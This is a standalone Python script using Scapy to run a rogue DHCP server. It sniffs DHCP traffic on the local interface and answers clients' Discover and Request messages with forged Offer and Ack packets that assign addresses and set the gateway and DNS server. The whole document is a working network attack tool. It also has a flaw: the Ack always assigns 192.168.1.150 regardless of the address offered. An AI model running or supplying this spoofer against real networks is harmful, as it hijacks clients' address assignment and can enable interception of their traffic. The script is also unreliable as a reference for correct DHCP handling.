#!/usr/bin/env python3
from scapy.all import *
import random

def dhcp_spoof(pkt):
    if DHCP in pkt:
        msg_type = pkt[DHCP].options[0][1]

        # DHCP Discover → send fake Offer
        if msg_type == 1:
            offered_ip = f"192.168.1.{random.randint(100,200)}"
            offer = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                    IP(src="192.168.1.1", dst="255.255.255.255") / \
                    UDP(sport=67, dport=68) / \
                    BOOTP(op=2, yiaddr=offered_ip,
                          chaddr=pkt[BOOTP].chaddr,
                          xid=pkt[BOOTP].xid) / \
                    DHCP(options=[("message-type", "offer"),
                                  ("server_id", "192.168.1.1"),
                                  ("lease_time", 600),
                                  ("subnet_mask", "255.255.255.0"),
                                  ("router", "192.168.1.1"),
                                  ("name_server", "8.8.8.8"),
                                  "end"])
            sendp(offer, iface=conf.iface, verbose=0)
            print(f"[+] Sent Offer for {offered_ip}")

        # DHCP Request → send fake Ack
        elif msg_type == 3:
            ack = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                  IP(src="192.168.1.1", dst="255.255.255.255") / \
                  UDP(sport=67, dport=68) / \
                  BOOTP(op=2, yiaddr="192.168.1.150",
                        chaddr=pkt[BOOTP].chaddr,
                        xid=pkt[BOOTP].xid) / \
                  DHCP(options=[("message-type", "ack"),
                                ("server_id", "192.168.1.1"),
                                ("lease_time", 600),
                                ("subnet_mask", "255.255.255.0"),
                                ("router", "192.168.1.1"),
                                ("name_server", "8.8.8.8"),
                                "end"])
            sendp(ack, iface=conf.iface, verbose=0)
            print("[+] Sent Ack")

def main():
    print("[+] Listening for DHCP packets...")
    sniff(filter="udp and (port 67 or 68)", prn=dhcp_spoof, store=0)

if __name__ == "__main__":
    main()
